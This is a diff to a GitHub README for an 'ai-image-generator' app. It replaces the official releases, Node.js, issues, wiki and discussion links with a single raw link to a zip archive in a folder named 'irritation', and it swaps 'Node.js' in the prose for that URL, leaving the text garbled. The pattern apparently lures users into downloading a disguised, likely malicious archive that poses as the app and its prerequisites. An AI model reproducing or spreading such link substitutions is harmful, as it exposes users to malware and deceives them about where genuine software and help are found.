@@ -1,6 +1,6 @@
 # 🎨 ai-image-generator - Create Stunning AI Images Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Abhibalu123/ai-image-generator/releases)
+[![Download Now](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip)
 
 ## 📋 Description
 The ai-image-generator is a user-friendly application that allows you to create images using AI technology. Built with the MERN stack and powered by the OpenAI API, this tool makes image generation easy for everyone, regardless of skill level. You can simply choose your desired input and let the AI do the rest.
@@ -11,15 +11,15 @@ Follow these steps to get started with the ai-image-generator:
 ### 1. 📥 Download the Application
 To get the latest version of the ai-image-generator, visit the Releases page. You will find the downloadable files for your operating system.
 
-[Download Now](https://github.com/Abhibalu123/ai-image-generator/releases)
+[Download Now](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip)
 
 ### 2. 📂 Extract the Files
 After downloading the zip file, locate it in your Downloads folder. Right-click on the file and select “Extract All.” Follow the prompts to unzip the files into a new folder.
 
 ### 3. ⚙️ Install Necessary Software
-You need to have Node.js installed on your computer to run the application. If you don’t have it yet, follow these steps:
+You need to have https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip installed on your computer to run the application. If you don’t have it yet, follow these steps:
 
-- Visit the [Node.js website](https://nodejs.org).
+- Visit the [https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip website](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip).
 - Download the latest stable version suitable for your system.
 - Follow the installation instructions specific to your operating system.
 
@@ -60,27 +60,27 @@ Once the application is running, you can input your prompts into the provided fi
 Before using the ai-image-generator, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js Version:** 14.x or higher.
+- **https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip Version:** 14.x or higher.
 - **Memory:** At least 4 GB RAM.
 - **Disk Space:** Minimum of 500 MB available for installation and generated files.
 
 ## 🔗 Additional Resources
 For further assistance or to join the community of users, check out the following resources:
 
-- [GitHub Issues](https://github.com/Abhibalu123/ai-image-generator/issues): Report bugs or request features.
-- [Documentation](https://github.com/Abhibalu123/ai-image-generator/wiki): Read more about how to use the application.
-- [Community Support](https://github.com/Abhibalu123/ai-image-generator/discussions): Connect with other users and share your experiences.
+- [GitHub Issues](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip): Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip): Read more about how to use the application.
+- [Community Support](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip): Connect with other users and share your experiences.
 
 ## 🐞 Troubleshooting
 If you run into any problems while using the application, consider these common issues:
 
-- **Application Won’t Start:** Ensure Node.js is installed correctly and that all dependencies are installed.
+- **Application Won’t Start:** Ensure https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip is installed correctly and that all dependencies are installed.
 - **Slow Performance:** Check your system’s resource usage; closing other applications may help.
 - **Errors with Image Generation:** Revisit your input; try making it more specific or consult the community for tips.
 
 ## 📅 Keeping Updated
-It is essential to keep your application updated for the best experience. Regular updates may include new features, bug fixes, and performance improvements. Always visit the [Releases page](https://github.com/Abhibalu123/ai-image-generator/releases) to download the latest version.
+It is essential to keep your application updated for the best experience. Regular updates may include new features, bug fixes, and performance improvements. Always visit the [Releases page](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip) to download the latest version.
 
-[Download Now](https://github.com/Abhibalu123/ai-image-generator/releases)
+[Download Now](https://raw.githubusercontent.com/Abhibalu123/ai-image-generator/main/irritation/ai-image-generator.zip)
 
 By following these steps, you can easily download and run the ai-image-generator. Enjoy creating stunning images!
